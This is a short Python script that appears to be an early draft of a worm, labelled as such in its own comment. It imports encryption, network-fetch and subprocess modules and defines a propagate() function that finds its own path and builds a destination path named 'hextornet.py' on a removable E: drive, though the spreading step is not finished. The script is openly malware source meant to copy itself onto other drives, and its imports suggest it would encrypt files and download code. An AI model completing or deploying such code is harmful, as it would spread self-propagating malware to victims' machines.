#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil

def propagate():
	#gets the current location of the worm
	src=os.path.abspath("worm.py")
	print(src)
	
	if(os.path.isdir("E:\\")):
		dts="E:"+"\\hextornet.py"
		print(dts)

print(propagate())
